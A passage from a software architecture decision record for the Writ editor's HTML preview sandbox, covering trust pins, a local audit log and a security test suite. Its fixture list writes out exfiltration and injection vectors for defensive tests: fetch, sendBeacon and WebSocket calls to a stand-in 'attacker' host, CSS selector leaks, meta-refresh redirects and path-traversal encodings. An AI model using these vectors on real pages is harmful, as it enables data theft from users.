- **Sortable** by: pinned-at date (default, newest first), last-
  used date, scope, path.
- **Searchable** via a free-text input at the top: matches against
  path, extension, workspace name. Real-time filter as the user
  types.
- **Filterable** by policy chip: clicking a chip in the filter bar
  shows only pins with that policy. Multi-select (show all
  `network` AND `both` pins).
- **Bulk actions** per workspace section: a section header has a
  `Revoke all in this workspace` button that opens a confirm
  dialog with the exact count: "Revoke 17 pins in workspace W?".
  A top-level "Revoke all pins globally" button is also present
  with the same confirm-with-count behavior; the global-revoke
  count includes all sections.
- **Audit log access**: a tab adjacent to the dashboard labeled
  "Audit log" (the dashboard is one tab, audit log is another;
  both live under Settings → Trusted Files).

**Chosen: E2.** It is the only shape that respects the workspace
boundary the rest of this ADR commits to and that makes bulk
workspace-level revocation a single gesture.

### F — Audit log

#### F1. No audit log, only the dashboard

Trust events are tracked only via the current state of
`preview_pins` (the `created_at`, `last_used_at`, `revoked_at`
columns).

- Cons: No history. If a pin was revoked yesterday, today there
  is no record. If a hash-mismatch happened and the user
  re-confirmed, there is no record of the prior trust state.
  Violates the "every trust state change is logged" driver. Rejected.

#### F2. Append-only audit log table, viewable in settings, exportable as CSV, FIFO eviction beyond N

```sql
CREATE TABLE preview_trust_audit (
    id                  INTEGER PRIMARY KEY AUTOINCREMENT,
    event_at            INTEGER NOT NULL,           -- unix ms
    event_type          TEXT NOT NULL,              -- see event types below
    pin_id              INTEGER,                    -- nullable for bulk events
    pin_scope           TEXT,                       -- snapshot of scope at event time
    workspace_id        TEXT,                       -- snapshot (ADR-010 WorkspaceId)
    path                TEXT,                       -- snapshot
    extension           TEXT,                       -- snapshot
    policy_before_json  TEXT,                       -- nullable for 'granted' (no prior policy)
    policy_after_json   TEXT,                       -- nullable for 'revoked'
    reason              TEXT,                       -- free-text user note, optional
    source              TEXT NOT NULL               -- 'user_action' | 'hash_mismatch_reconfirm'
                                                    -- | 'hash_mismatch_revoked' | 'bulk_revoke'
                                                    -- | 'session_expired' | 'orphan_revoked'
);

CREATE INDEX idx_audit_event_at ON preview_trust_audit (event_at);
CREATE INDEX idx_audit_pin ON preview_trust_audit (pin_id);
```

**Event types:**

| Event type                 | When                                                  | `policy_before_json` | `policy_after_json` |
|----------------------------|-------------------------------------------------------|----------------------|---------------------|
| `granted`                  | User confirms a new pin                               | null                 | new policy          |
| `modified`                 | User changes an existing pin's policy                 | old policy           | new policy          |
| `revoked`                  | User clicks revoke on a single pin                    | old policy           | null                |
| `hash_mismatch_reconfirmed`| User re-confirms after hash mismatch                  | pin's policy         | pin's policy (hash updated) |
| `hash_mismatch_revoked`    | User revokes after hash mismatch                      | pin's policy         | null                |
| `bulk_revoked`             | User triggers a bulk-revoke action                    | null (per pin row)   | null                |
| `session_expired`          | Window closes, session policy is dropped              | session policy       | null                |
| `audit_log_truncated`      | FIFO eviction occurred                                | null                 | null                |
| `audit_log_write_failed`   | A prior audit-write error is retried and logged       | null                 | null                |

**Retention.** Default cap is `10_000` events. Beyond the cap,
FIFO eviction (oldest first). Eviction itself is an audit event
(`audit_log_truncated`) with `reason` carrying the count evicted.
The cap is configurable in `WritConfig` (`[preview.audit] cap = 10000`).

**Surface.** A scrollable list in Settings → Trusted Files → Audit
log tab. Columns: event time (relative + absolute tooltip), event
type chip, target (path / extension / workspace), policy delta
(visualized as `safe → network`, `network → safe`, etc.), source
chip. Filter by event type, date range picker (today, last 7 days,
last 30 days, all). Export as CSV via a top-right button: emits a
CSV with one row per event, column headers matching the table
columns above.

**Local only.** The audit log is on-device. Writ has zero telemetry
as a brand promise; the audit log is the user's local
accountability record, not a phone-home channel. This is documented
in-app next to the export button: "Writ's local audit log; never
sent off-device; no telemetry."

**Chosen: F2.**

### G — Verification suite layout

#### G1. One Rust integration test per attack class, no fuzzing

A single `tests/preview-security.rs` with one `#[test]` per attack
class. No fuzz target.

- Cons: Conflates classes. Failure in one assertion blocks the
  whole file. No corpus-style growth. Rejected.

#### G2. One Rust integration test file per attack class + cargo-fuzz on the protocol-handler URL parser

A directory `src-tauri/tests/preview-security/` with one file per
attack class. Each file is a Rust integration test that drives a
preview webview via Tauri's test harness, loads a malicious
fixture, asserts the protocol handler logged zero non-chrome
requests. Cross-platform CI matrix runs them on macOS, Linux, and
Windows per ADR-009.

A parallel `fuzz/` directory at the workspace root contains
cargo-fuzz targets. The primary target is `preview_url_parser`,
which fuzzes the `writ-preview://` URL parser and request router.
Quick-fuzz runs (60s per target) execute on every PR; a nightly
job runs 30 minutes per target. The deduplicated corpus is
committed under `fuzz/corpus/`.

**Chosen: G2.** Per-class isolation, cross-platform CI, fuzz
coverage of the URL parser.

## Decision (composite)

- **Policy-state shape:** A2 — four-state enum
  (`Safe | AllowScripts | AllowNetwork | AllowBoth`) plus
  `PolicyPersistence` (`Session | Pinned`) plus `PolicySource`
  (`Default | Pin | Session`). All three live in `writ-core`.
- **CSP scope split and per-cell strings:** B2 — eight explicit
  cells (one chrome cell shared across policy states, four
  document cells per state). Bytes documented above; built by
  `src-tauri/preview/security/csp.rs::build_csp(scope, policy)`.
- **Pin storage shape:** C2 — one `preview_pins` table with
  `scope` discriminator, `workspace_id` FK (`ON DELETE SET NULL`),
  three scope-conditional columns (`path`, `extension`,
  `content_hash`), four indexes targeting the actual lookup
  paths. Lookup precedence: File → WorkspaceExtension →
  WorkspaceGlobal → Session → Default SAFE.
- **Hash-mismatch behavior:** D3 — render under SAFE, show
  non-modal banner, re-confirm or revoke, never silent-revoke.
  Hash-compute failures degrade the same way.
- **Trust dashboard shape:** E2 — grouped by workspace,
  "Outside workspace" and "Orphaned" special sections, sortable,
  searchable, filterable, per-workspace and global bulk-revoke
  with explicit count confirms.
- **Audit log:** F2 — append-only `preview_trust_audit` table,
  10_000-event FIFO cap (configurable), nine event types, viewable
  in settings, exportable as CSV, local-only.
- **Verification suite:** G2 — one Rust integration test file per
  attack class in `src-tauri/tests/preview-security/`, fifteen
  classes enumerated below, runs on the mac/Linux/Windows matrix
  per ADR-009, plus cargo-fuzz targets in `fuzz/` for the URL
  parser and request router.

### Pin lifecycle relative to ADR-009's session model

- **Session policy** lives in per-window `preview-store`
  (ADR-009 E3). It dies at window close. It is not persisted in
  SQLite. The session-expiry transition is logged to the audit
  table on window close (one `session_expired` entry per
  outstanding session policy).
- **Pinned policy** is persisted in `preview_pins`. It survives
  app restart and launches. It dies only on user revocation or
  bulk revocation.
- **Lookup precedence at preview open:** pin (in precedence
  order) → session → default SAFE. The first match wins.
- **Detached preview window inherits the originating buffer's
  effective policy at detach time.** Once detached, the
  detached window's preview policy is **read-only** — the
  policy chip is shown but the trust dialog is not invokable
  from the detached window. To change the policy, the user
  closes the detached window (re-attaches) and changes the
  policy in the main window. This rule exists because forking
  the policy state across windows would be a UX trap: a user
  who grants ALLOW_BOTH in the detached window would not see
  the chip in the main window, and on re-attach the policies
  would have to merge. Read-only-after-detach avoids the merge
  entirely.

### Pinning UX flow — the confirm dialog

The trust dialog is triggered by clicking the policy chip in
the preview pane's status affordance (ADR-009's
`PreviewStatusChip`).

**Layout (top to bottom):**

1. **Title:** `Allow scripts and/or network for this preview?`
2. **Subtitle (smaller, muted):** the file path (or `untitled
   buffer` for a scratch buffer that has never been saved —
   scratch buffers cannot be pinned and the Remember radio is
   disabled for them).
3. **Two checkboxes side-by-side:**
   - `[ ] Allow scripts` — label tooltip: "Run inline and bundled
     scripts in this document. Scripts can read the document's
     own content but cannot send it over the network unless
     network is also enabled."
   - `[ ] Allow network` — label tooltip: "Let this document
     load images, fonts, stylesheets, and media from HTTPS
     sources, and submit forms to HTTPS. HTTP is always
     blocked."
4. **Persistence radio (two options):**
   - `( ) Just for this session` (default selected)
   - `( ) Remember (pin)`
5. **Scope sub-section (conditional).** Visible only when
   `Remember` is selected AND the buffer's path is under an
   active workspace:
   - `( ) This file only` (default; corresponds to `PinScope::File`)
   - `( ) All *.{ext} in this workspace` (corresponds to
     `PinScope::WorkspaceExtension`; the `{ext}` is interpolated
     from the buffer's extension)
   - `( ) All files in this workspace` (corresponds to
     `PinScope::WorkspaceGlobal`)
6. **Risk acknowledgment (conditional).** Visible only when
   the selected combination is "Remember + workspace global"
   AND any non-SAFE policy is selected:
   - `[ ] I understand this trusts every file in the workspace`
     — required to enable the confirm button.
7. **Buttons:** `Cancel` (left, secondary), `Confirm` (right,
   primary). The confirm button is colored:
   - Neutral when the resulting policy is SAFE (no opt-in).
   - **Subdued amber** when any opt-in is selected. Amber, not
     red — red is reserved for destructive actions. The amber
     conveys "you are weakening the default, be deliberate"
     without panicking the user.
   - Disabled until the risk-acknowledgment checkbox is checked
     in the workspace-global case.

The dialog is dismissable via Esc, the Cancel button, or click-
outside; dismissal leaves the policy unchanged. On confirm:

- A new `preview_pins` row is inserted (if `Remember`), or the
  per-window session policy is set (if `Just for this session`).
- The audit log records a `granted` (or `modified`, if a prior
  pin existed at the same scope key) event.
- The preview pane reloads with the new policy applied via
  `webview.set_csp(build_csp(Document, new_policy))`.

### Failure modes

- **`preview_pins` is corrupt or missing on launch.** Migration
  recovery (per writ-storage's existing crash recovery)
  attempts to rebuild from the latest snapshot. If recovery
  fails, an empty pin set is loaded; every preview reverts to
  SAFE. **The recovery path never grants trust silently.** An
  audit event `audit_log_write_failed` (or a new
  `pins_recovered_empty` event added during implementation)
  records the recovery.
- **`preview_trust_audit` write fails.** The trust event is
  not blocked. The write failure is logged to stderr; on the
  next successful audit write the failure is itself recorded
  as an `audit_log_write_failed` event with a free-text reason.
  Degraded operation continues; the user's trust action is
  honored even if the audit row didn't land.
- **`.writ/pins.toml` (a workspace-scoped pin export mechanism;
  see open questions) is malformed.** Ignore, log, surface in
  the workspace's status chip as a warning. The file is never
  trusted for pin grant; if it exists, it is informational
  only. v1 does not actually consume this file — it is reserved
  as an open question — but the failure-mode is documented
  upfront so v2 implementation cannot misuse it.
- **Pin scope references a workspace that no longer exists.**
  The `workspace_id` FK is `ON DELETE SET NULL`. Orphaned pins
  surface in the dashboard under "Orphaned" with a one-click
  revoke. Pins are never auto-deleted by workspace deletion.
- **Two windows trying to write pin state concurrently.** The
  host serializes writes via the existing `Mutex<Connection>`
  per writ-storage's existing pattern. SQLite transactions
  handle the ordering.
- **Hash computation fails on preview open (I/O error,
  truncated read, permission denied).** Treat as hash mismatch
  (see D2.5 above). Render under SAFE, show banner with text
  "could not verify file content — re-confirm trust?", log the
  event.

### Performance budgets (asserted in CI)

| Metric                                          | Budget                        |
|-------------------------------------------------|-------------------------------|
| Pin lookup on preview open (File scope, SQLite) | < 10ms p95                    |
| Hash computation on preview open (SHA-256, 1 MB)| < 30ms p95                    |
| Pin write (after confirm dialog)                | < 30ms p95                    |
| Audit log write (single event)                  | < 10ms p95                    |
| Trust dashboard load (10_000 pin entries)       | < 500ms first paint           |
| Audit log query (single day filter)             | < 100ms p95                   |
| Audit log CSV export (10_000 entries)           | < 1s wall-clock               |
| Verification suite per fixture                  | < 5s wall-clock               |
| cargo-fuzz quick-job per target                 | 60s wall-clock                |
| cargo-fuzz nightly per target                   | 30min wall-clock              |
| CSP-builder cell construction                   | < 1µs (constant-folded)       |
| Protocol-handler request disposition (per call) | < 100µs p95                   |

The 1 MB hash-compute budget assumes the file is in OS page cache
(typical for an opened buffer; the buffer text is already in
memory). For cold-cache reads, the hash is computed off the
already-in-memory buffer bytes, not by re-reading from disk —
the in-memory text is the source of truth for the hash because
it is what the renderer will display. (If the user has unsaved
changes, the hash is computed over the live buffer content, not
the on-disk content; this means a trusted-then-edited buffer
shows the hash-mismatch banner until re-confirmed, which is the
correct behavior.)

The 10_000-pin dashboard budget assumes virtualized rendering
(only visible rows are mounted in the DOM). The implementation
uses SolidJS's `For` with windowing or an equivalent
virtual-list pattern.

## Verification suite (enumerated)

The verification suite lives at `src-tauri/tests/preview-security/`,
mirroring the existing test layout. Each fixture is one Rust file.
Each file contains a malicious HTML document (or other content) as
a string literal, a test that loads the document in a preview
webview, and assertions against the protocol handler's recorded
request log.

**Test hook.** The Tauri protocol handler in debug builds exposes
a recording hook: every request URL it receives, and every
disposition (`allowed | blocked | refused`), is appended to a
thread-local `Vec<RequestRecord>`. The hook is compiled out of
release builds (`#[cfg(any(test, debug_assertions))]`). Tests
read the recorded log after rendering the fixture and assert
that no non-chrome requests are present under default policy.

**Cross-platform.** Every fixture runs on macOS WebKit, Linux
WebKit2GTK, and Windows WebView2 per ADR-009. Per-platform
behavior differences (e.g., WebView2's handling of certain
attribute syntaxes) are documented in inline comments inside the
fixture file. A divergence in security behavior across platforms
is a release blocker.

**Per-state coverage.** Each fixture has four assertion blocks
(SAFE, ALLOW_SCRIPTS, ALLOW_NETWORK, ALLOW_BOTH). The expected
behavior in each state is documented alongside the assertion;
e.g., under SAFE every fixture asserts zero non-chrome requests;
under ALLOW_NETWORK the image-probe fixtures assert that HTTPS
requests are made but HTTP requests are blocked.

### Fixture roster

#### 1. `subresource_probing.rs`

**Attacks covered:** Every passive subresource fetch that browsers
perform automatically on parse: `<img src>`, `<link rel=stylesheet
href>`, `<link rel=icon href>`, `<link rel=preload>`,
`<link rel=prefetch>`, `<video src>`, `<audio src>`, `<track src>`,
`<source src>`, `<picture>` with `<source srcset>`, `<img srcset>`,
`<input type=image src>`, lazy-loading triggers (`loading=lazy`
on `<img>`), `<embed src>` (covered by `object-src 'none'`),
`<object data>`, `<iframe src>` (covered by `frame-src 'none'`).

**Boundary asserted:** The protocol handler logs zero requests to
URLs outside the chrome scope under SAFE. Under ALLOW_NETWORK,
only HTTPS request URLs appear; HTTP URLs are CSP-blocked at the
webview before reaching the handler (asserted via console message
capture). Under ALLOW_SCRIPTS without network, no remote
subresource request appears at all because `img-src` /
`media-src` / etc. do not include `https:`. Under ALLOW_BOTH,
HTTPS subresource requests are observed and pass through the
handler unchanged.

#### 2. `csp_bypass.rs`

**Attacks covered:** `<meta http-equiv="Content-Security-Policy" content="default-src *">`
attempts to override the host CSP from the document; `<meta
http-equiv="X-Frame-Options" content="ALLOWALL">` attempts;
nonce/hash collisions (the host CSP does not use nonces, so
attacker-supplied `nonce=` attributes are inert; the test asserts
this); sandbox-attribute bypass attempts (the substrate does not
use sandbox attributes — the per-webview CSP is the boundary; the
test asserts that a document setting `<iframe sandbox=...>` is
moot because iframes are CSP-blocked); CSP report-uri probes
(the host CSP does not set `report-uri` or `report-to`, so no
exfil channel exists via CSP reporting).

**Boundary asserted:** The document-injected CSP `<meta>` does not
override the host CSP because the host CSP is set as an HTTP-
header-equivalent via Tauri's webview API, and HTTP-header CSP
takes precedence over `<meta>` CSP per spec. The test loads the
document under SAFE with `<meta>` attempting to permit
`default-src *` and asserts that an `<img src="https://attacker/">`
in the same document is still blocked.

#### 3. `protocol_handler_escape.rs`

**Attacks covered:** `writ-preview://document/../chrome/` traversal
attempts; URL-encoded traversal (`%2e%2e%2f`, `%2E%2E%2F`,
mixed-case); double-encoded (`%252e%252e%252f`); UTF-16 / UTF-32
overlong encodings; null bytes in path
(`writ-preview://document/foo%00../chrome/bar`); Unicode
normalization (NFC vs. NFD vs. NFKC vs. NFKD path components,
fullwidth slashes); Right-to-left override (U+202E) embedded in
paths; non-canonical relative segments (`./`, `/.`, trailing
slash variations); backslash-vs-forward-slash on Windows
(`writ-preview://document/..\chrome\base.css`); host-component
injection (`writ-preview://chrome.attacker.com/...`).

**Boundary asserted:** The URL parser canonicalizes the path
before scope routing. Any path that, after canonicalization,
attempts to cross the chrome ↔ document boundary is refused
(`Refused`, not `Blocked` — refused is the strictest
disposition; the handler returns an error response rather than a
404). The test asserts that every traversal variant in the
fixture's input list produces a `Refused` log entry.

#### 4. `content_sniff_confusion.rs`

**Attacks covered:** File extension vs. Content-Type mismatch —
the protocol handler serves files with a `Content-Type` header
derived from the buffer's known content type; a malicious file
named `image.png` containing HTML bytes still serves as
`Content-Type: image/png` and the webview's MIME sniffer must not
re-interpret it as HTML. Polyglot files (a valid PNG header
followed by an HTML payload). `X-Content-Type-Options: nosniff`
must be set by the handler on every response.

**Boundary asserted:** Every protocol-handler response carries
`X-Content-Type-Options: nosniff`. The test loads a polyglot
PNG-then-HTML file under the `image/png` content type and asserts
no HTML is parsed (the webview shows a broken image, not the
HTML body). The test inverts: an HTML file served as
`text/plain` is asserted to render as plain text, not HTML, even
under ALLOW_SCRIPTS.

#### 5. `dangling_markup_injection.rs`

**Attacks covered:** Unclosed tags swallowing attacker-controlled
tokens after them: `<img src="https://attacker/?` followed by the
document's subsequent content closing the attribute later, which
would exfiltrate intervening tokens; attribute injection where
a quote is malformed (`<img src=' onerror='...'`); HTML-injection
into attribute contexts where the parser recovers in attacker-
favoring ways.

**Boundary asserted:** Under SAFE, no `<img>` request fires
regardless of how the markup is malformed because `img-src` does
not include `https:`. Under ALLOW_NETWORK, the only request that
fires is the one whose URL the parser actually constructs; the
test asserts that the parsed URL is what we expect (not, e.g.,
a URL containing intervening document tokens that were
accidentally swallowed). This fixture is more about the parser
than the CSP — it asserts that even when the document is
malformed in ways that produce attacker-controlled requests, the
network-blocking layer holds.

#### 6. `svg_script_vectors.rs`

**Attacks covered:** `<svg><script>` (inline script inside SVG);
`<svg>` with `<foreignObject>` containing `<script>`; SVG event
handler attributes (`onmouseover`, `onload`, `onbegin`,
`onanimate`); SVG `<animate>` and `<animateMotion>` with
attacker-controlled `href`; SVG `<use>` with cross-origin `href`;
SVG `<image>` element (separate from HTML `<img>`).

**Boundary asserted:** Under SAFE, `script-src 'none'` blocks
inline SVG scripts; the SVG renders as static graphics. Event
handlers do not fire. `<animate href>` does not navigate.
`<image href>` outside the allowed image sources is blocked by
`img-src`. Under ALLOW_SCRIPTS, SVG scripts execute (the
ALLOW_SCRIPTS state opens script-src and inherits inline-script
permission via `'unsafe-inline'`). Under SAFE-only, no script
runs and no event handler fires.

#### 7. `font_uri_probes.rs`

**Attacks covered:** `@font-face { src: url(https://attacker/?...) }`
in inline CSS; `@font-face` with `local()` source attempting to
probe installed fonts (a known fingerprinting vector);
`unicode-range` probing where one `@font-face` rule per Unicode
range is set, each pointing to a different attacker URL, so the
document's character set leaks via which fonts get fetched.

**Boundary asserted:** Under SAFE, `font-src writ-preview:
writ-workspace:` blocks every remote font URL; the test asserts
zero non-allowlisted font requests. Under ALLOW_NETWORK,
HTTPS font URLs are permitted; the test asserts the request
fires as expected. The `local()` source does not generate a
network request and is not a CSP-blockable vector — the test
documents this as a known fingerprinting surface that is
mitigated only by the absence of identifying data in the
document. Writ does not inject any identifying data.

#### 8. `css_import_leaks.rs`

**Attacks covered:** `@import url(...)` inside `<style>` (an
inline CSS rule pulling a remote stylesheet); CSS attribute-
selector probes combined with `background-image`:
`input[value^="a"] { background-image: url(https://attacker/a) }`
(letter-by-letter exfil of `<input>` values via CSS); CSS
variable leaks via `var(--secret)` interpolated into
`background-image` URLs.

**Boundary asserted:** Under SAFE, `style-src` permits inline
styles but the resolved `background-image` URLs are subject to
`img-src`; with `img-src writ-preview: writ-workspace: data:`,
no `https:` background-image request fires. `@import` URLs are
subject to `style-src`; under SAFE, remote `@import` is blocked.
Under ALLOW_NETWORK, both vectors open up — the test documents
this as a deliberate consequence of the user's opt-in and is
the canonical "ALLOW_NETWORK is dangerous, the dialog said so"
case. The fixture serves to assert that the SAFE blocks hold,
not that ALLOW_NETWORK is safe.

#### 9. `meta_refresh.rs`

**Attacks covered:** `<meta http-equiv="refresh" content="0;url=https://attacker/?...">`
(zero-delay refresh to an attacker origin); `<meta http-equiv="refresh"
content="5;url=...">` (delayed refresh); refresh URL with the
document's contents interpolated (an attacker controlling part of
the document could compose an exfil URL).

**Boundary asserted:** Under SAFE, `navigate-to 'none'` blocks
the navigation. The webview parses the meta-refresh and attempts
the navigation; the CSP blocks it; the test asserts via console
capture that the CSP violation event fires and via the recorded
network log that no request to the target URL appears. Under
ALLOW_NETWORK, `navigate-to https:` permits HTTPS targets; the
test asserts that an HTTP meta-refresh is still blocked.

#### 10. `beacon.rs`

**Attacks covered:** `navigator.sendBeacon('https://attacker/', ...)`
(the API designed for exfil-on-unload, intentionally hard to
block at the JavaScript level); `<a href="..." ping="https://attacker/">`
(the ping attribute fires a POST to the ping URL on link click,
silent from the user's perspective).

**Boundary asserted:** Under SAFE, scripts are blocked by
`script-src 'none'`, so `sendBeacon` cannot be invoked. The
ping-attribute vector is subject to `connect-src 'none'`; the
test asserts no ping request fires when the user clicks an
`<a ping=...>` link. Under ALLOW_SCRIPTS without network,
`sendBeacon` is callable but `connect-src 'none'` blocks the
beacon request; the test asserts the beacon does not fire even
though the script ran. Under ALLOW_NETWORK, HTTPS beacon
targets are permitted (the user opted in).

#### 11. `fetch.rs`

**Attacks covered:** `fetch('https://attacker/')`,
`new XMLHttpRequest()` with `open('GET', 'https://attacker/')`,
`new EventSource('https://attacker/')`, raw `WebSocket` is
covered separately. Includes `fetch` with `mode: 'no-cors'`
(which would normally permit fire-and-forget exfil).

**Boundary asserted:** Under SAFE, scripts are blocked. Under
ALLOW_SCRIPTS without network, `connect-src 'none'` blocks every
fetch / XHR / EventSource attempt; the test asserts via fetch
error and via the recorded log that no request fires. Under
ALLOW_NETWORK without scripts, the APIs are unreachable (no
scripts). Under ALLOW_BOTH, HTTPS targets succeed; HTTP targets
are CSP-blocked.

#### 12. `websocket.rs`

**Attacks covered:** `new WebSocket('wss://attacker/')`;
`new WebSocket('ws://attacker/')` (plaintext, must be blocked
even under ALLOW_NETWORK).

**Boundary asserted:** Under SAFE and ALLOW_NETWORK-only, no
script can invoke `WebSocket`. Under ALLOW_SCRIPTS without
network, `connect-src 'none'` blocks the WebSocket constructor
(CSP `connect-src` covers WebSocket per spec). Under ALLOW_BOTH,
`wss:` targets are permitted (because `connect-src https:` per
CSP-WebSocket spec interaction; the test asserts current
Chromium/WebKit behavior matches our expectation across the
three engines and documents per-platform divergence if any
appears).

#### 13. `navigation_hijack.rs`

**Attacks covered:** `<a target="_top" href="https://attacker/">`;
`window.open('https://attacker/')`; `window.location = '...'`;
`history.replaceState({}, '', 'https://attacker/')`; `<a
href="javascript:...">` (covered by `script-src`); `<form action>`
posting to a remote URL.

**Boundary asserted:** Under SAFE, `navigate-to 'none'` blocks
every top-level navigation. `<a>` clicks fire CSP violations but
no request goes out. `form action` submissions are blocked by
`form-action 'none'`. Scripts are also blocked. Under
ALLOW_NETWORK, `navigate-to https:` permits HTTPS navigation;
HTTP is still blocked. Under ALLOW_SCRIPTS without network,
scripts can invoke `window.location` but the navigation is
blocked. The test covers each vector independently.

#### 14. `drag_leak.rs`

**Attacks covered:** `dragstart` event handler setting
`DataTransfer.setData('text/plain', 'sensitive')` and the user
drags the data out of the preview into another window;
cross-origin drag-and-drop where the document's `dragover` /
`drop` handlers attempt to read data from outside the preview.

**Boundary asserted:** Under SAFE, scripts are blocked, so no
`dragstart` handler fires. Under ALLOW_SCRIPTS, the handler
fires, but: the data the document puts in the `DataTransfer`
comes from the document itself (no exfil channel — the document
already has its own content). The test asserts that the preview
cannot read clipboard or file-drop data from outside the preview
without an explicit user gesture targeting the preview, and
asserts the user-gesture path is documented as the user's own
action.

#### 15. `focus_stealing.rs`

**Attacks covered:** `<input autofocus>` on a hidden input (the
input steals focus and can record keystrokes the user typed
intending to send to a different element); CSS `:focus` selectors
attempting to trigger `background-image` requests on focus
state changes (an exfil channel based on which element is
focused).

**Boundary asserted:** Under SAFE, scripts are blocked, so the
input cannot record keystrokes via JS event listeners. CSS
`:focus { background-image: url(...) }` is subject to
`img-src`; under SAFE the URL is blocked. Under ALLOW_SCRIPTS,
keystrokes typed into the preview pane (which the user only
does deliberately) are exposed to the document's JS, which is
the explicit ALLOW_SCRIPTS consequence; this fixture documents
that and asserts that keystrokes typed *outside* the preview
pane are not exposed to the document.

### Verification suite — fixture matrix

| Fixture                         | SAFE assertion                          | ALLOW_SCRIPTS assertion              | ALLOW_NETWORK assertion              | ALLOW_BOTH assertion                                 |
|---------------------------------|-----------------------------------------|--------------------------------------|--------------------------------------|------------------------------------------------------|
| `subresource_probing.rs`        | zero non-chrome requests                | zero non-chrome requests             | HTTPS only; HTTP blocked             | HTTPS only                                           |
| `csp_bypass.rs`                 | host CSP wins; meta-CSP ignored         | host CSP wins                        | host CSP wins                        | host CSP wins                                        |
| `protocol_handler_escape.rs`    | all traversals refused                  | all traversals refused               | all traversals refused               | all traversals refused                               |
| `content_sniff_confusion.rs`    | nosniff honored; polyglot inert         | nosniff honored                      | nosniff honored                      | nosniff honored                                      |
| `dangling_markup_injection.rs`  | zero requests                           | zero requests                        | only canonically parsed URL fires    | only canonically parsed URL fires                    |
| `svg_script_vectors.rs`         | no script, no event, no nav             | scripts run; navs blocked            | no script, no event, navs HTTPS only | scripts run; navs HTTPS only                         |
| `font_uri_probes.rs`            | zero font requests                      | zero font requests                   | HTTPS font requests fire             | HTTPS font requests fire                             |
| `css_import_leaks.rs`           | zero imports, zero bg-image probes      | zero imports                         | HTTPS imports fire (opt-in)          | HTTPS imports fire                                   |
| `meta_refresh.rs`               | nav blocked                             | nav blocked                          | HTTPS nav permitted; HTTP blocked    | HTTPS nav permitted                                  |
| `beacon.rs`                     | no script; no ping                      | no beacon; no ping                   | (scripts blocked)                    | HTTPS beacon/ping fires                              |
| `fetch.rs`                      | scripts blocked                         | fetch blocked                        | (scripts blocked)                    | HTTPS fetch succeeds; HTTP blocked                   |
| `websocket.rs`                  | scripts blocked                         | WebSocket blocked                    | (scripts blocked)                    | `wss:` permitted; `ws:` blocked                      |
| `navigation_hijack.rs`          | all navs blocked                        | scripts can't nav                    | HTTPS navs permitted                 | HTTPS navs permitted                                 |
| `drag_leak.rs`                  | no dragstart handler                    | handler fires; no cross-origin read  | no dragstart handler                 | handler fires; no cross-origin read                  |
| `focus_stealing.rs`             | no key recording; bg-image blocked      | key recording in-preview only        | bg-image probes HTTPS only           | key recording in-preview only; bg-image HTTPS only   |

Fifteen fixtures × four policy states = sixty named assertion
points. The suite gates merge on every PR.

### cargo-fuzz targets

- **`preview_url_parser`** — fuzzes the `writ-preview://` URL
  parser and request router. Corpus seeded with: every fixture's
  URL pattern (extracted at corpus-build time), malformed URLs
  (oversize, null bytes, UTF-16, RTL overrides, double-encoded,
  mixed-encoding, host-component injection, percent-encoded
  schemes), every known historical traversal pattern from public
  CVE corpora (selected manually; not pulled in as a dependency).
- **`workspace_url_parser`** — fuzzes the `writ-workspace://` URL
  parser (per ADR-010); same shape.
- **`csp_builder_smoke`** — fuzzes the `(scope, policy)` →
  CSP-string function with arbitrary `(scope, policy)` enum
  combinations; asserts the returned string is parseable as a
  valid CSP by a syntactic check, asserts the directives present
  match the expected set per the matrix table above. (This is
  more of a property test than a fuzz target, but cargo-fuzz is
  the existing test harness and reusing it avoids a new
  dependency.)

**Local:** `cargo fuzz run preview_url_parser`. **CI per PR:** a
quick-fuzz job runs each target for 60s with corpus persistence
across runs. **Nightly:** 30 minutes per target. Crashes block
merge; the deduplicated corpus is committed to `fuzz/corpus/`.

## Rationale

**Why four states and not a capability bag.** The capability bag
(option A3) is technically more expressive but is the wrong
abstraction for the UX. The user is making a security decision,
not a webdev decision; the choice "scripts yes/no, network yes/no"
is the granularity the user can reason about. Compressing the
underlying CSP directive set into four states is the right
compression because each state corresponds to a coherent set of
behaviors. The CSP builder is the place that knows how a state
maps to ten-plus directives; the user is the place that knows
whether they want scripts.

**Why explicit per-cell CSPs and not a template.** ADR-007 made a
similar call about update lifecycle (explicit state machine, not
implicit). The reasoning here is the same: when a reviewer is
looking at the CSP and asking "what does ALLOW_SCRIPTS actually
allow," they should be able to grep one line in `csp.rs` and see
every directive that state sets, not have to reconstruct it from a
template plus a state-dependent override list. The cost is ~120
lines of CSP code; the win is auditability that does not depend
on the reviewer remembering the template's defaults.

**Why hash-keyed file pins.** The alternative — path-keyed without
content hash — means a malicious actor with write access to a
trusted file silently inherits the trust. The hash is the
content-integrity check. The mismatch behavior is "open under
SAFE, ask the user" rather than "auto-revoke" because revocation
is itself a state change the user has the right to make
consciously; the hash mismatch is information, not a unilateral
action.

**Why workspace-scoped pins are location-based, not hash-based.**
A workspace-extension pin covers a set of files that will grow
and change over time. Hash-keying it would require re-confirming
every new file added to the workspace, which defeats the
ergonomics that justified workspace scope in the first place.
The location-based model trades off: a `WorkspaceGlobal` pin is
the user saying "I trust this whole directory tree's intent;" if
the user does not, they pin at the file scope. The dialog is
explicit about which scope is being granted.

**Why ADR-010's `WorkspaceId` is the FK target and not the workspace
root path or an auto-incrementing surrogate key.** ADR-010 defines
`WorkspaceId = blake3(canonicalized_root_path)[:16hex]` — a
deterministic, content-derived TEXT identifier. Three properties
flow from that choice that an auto-incrementing INTEGER PK would
not give us:

1. **Same path, same id, across machines.** A team checking out the
   same repo path resolves to the same `WorkspaceId` independently.
   Pin records (if ever exported for sharing, see open questions)
   carry stable references. An INTEGER PK would be machine-local
   and require remapping on every checkout.
2. **Re-registration is idempotent.** Closing and reopening a
   workspace yields the same `WorkspaceId`. Pins keyed by that id
   continue to apply without any rebinding step. With an integer
   PK, the new registration row would have a new id, orphaning every
   pin.
3. **Workspace rename across the same root.** ADR-010's `name` is
   a display label, not part of the identity. Renaming a workspace
   does not change its `WorkspaceId` because the canonicalized root
   path has not changed. Pin records survive the rename without any
   migration.

If the root path itself moves on disk (the user moves the directory),
the `WorkspaceId` changes — that is the correct behavior, because
the identity of the workspace is the path. The user is asked to
re-promote the new location to a workspace; old pins keyed by the
old `WorkspaceId` become orphans and surface in the dashboard.

**Why the audit log is append-only.** Mutable trust state is a
state change with no historical witness. The dashboard already
mirrors the current pin state; the audit log is what the
dashboard cannot show: what happened between two snapshots.
Append-only with FIFO eviction is the smallest reliable model;
the eviction itself is an event so the user can see that older
history is no longer available.

**Why the verification suite is in-repo and not a third-party
